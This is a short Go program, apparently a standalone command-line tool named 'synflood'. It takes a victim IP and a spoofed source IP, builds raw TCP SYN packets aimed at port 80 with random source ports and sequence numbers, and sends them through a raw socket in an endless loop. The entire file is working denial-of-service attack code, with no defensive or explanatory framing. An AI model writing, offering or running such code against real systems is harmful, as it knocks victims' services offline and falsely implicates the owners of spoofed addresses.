package main

import (
	"errors"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func main() {
	log.SetPrefix("")
	log.SetFlags(0)
	if os.Geteuid() != 0 {
		log.Fatal(errors.New("please run as root"))
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	check(err)
	if len(os.Args) < 3 {
		log.Fatal("usage: synflood <victimIP> <spoofedIP>")
	}
	raddr := net.ParseIP(os.Args[1])
	addr := syscall.SockaddrInet4{
		Port: 0,
		Addr: to4Array(raddr),
	}
	p := packet(raddr)
	switch runtime.GOOS {
	case "darwin", "dragonfly", "freebsd", "netbsd":
		// need to set explicitly
		check(syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1))
		// no need to receive anything
		check(syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1))
	case "linux":
		// no need to receive anything
		check(syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 0))
	}
	for {
		check(syscall.Sendto(fd, p, 0, &addr))
	}
}

func packet(raddr net.IP) []byte {
	ip := &layers.IPv4{
		Version:           0x4,
		TOS:               0x0,
		TTL:               0x40,
		Protocol:          layers.IPProtocolTCP,
		SrcIP:             net.ParseIP(os.Args[2]),
		DstIP:             raddr,
		WithRawINETSocket: true,
	}
	rand.Seed(time.Now().UnixNano())
	tcp := &layers.TCP{
		SrcPort:    layers.TCPPort(rand.Uint32()),
		DstPort:    0x50,
		Seq:        rand.Uint32(),
		DataOffset: 0x5,
		SYN:        true,
		Window:     0xaaaa,
	}
	tcp.SetNetworkLayerForChecksum(ip)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{true, true}
	check(gopacket.SerializeLayers(buf, opts, ip, tcp))
	return buf.Bytes()
}

func to4Array(raddr net.IP) (raddrb [4]byte) {
	copy(raddrb[:], raddr.To4())
	return
}

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
